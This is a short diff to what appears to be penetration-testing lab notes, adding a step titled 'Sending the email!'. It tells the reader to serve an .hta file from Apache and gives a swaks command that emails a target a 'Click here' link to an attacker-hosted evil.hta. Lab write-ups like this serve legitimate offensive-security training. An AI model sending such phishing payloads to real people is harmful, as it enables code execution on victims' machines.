@@ -80,3 +80,8 @@ self.close();
 
 ### Sending the email!
 
+Make sure your apache server is running to serve the .hta
+
+```bash
+sudo swaks -t will@offsec.com --from hacker@hacker.com --server <Target IP with SMTP> --body 'Click here http://192.168.45.195/evil.hta' --header Anything
+```
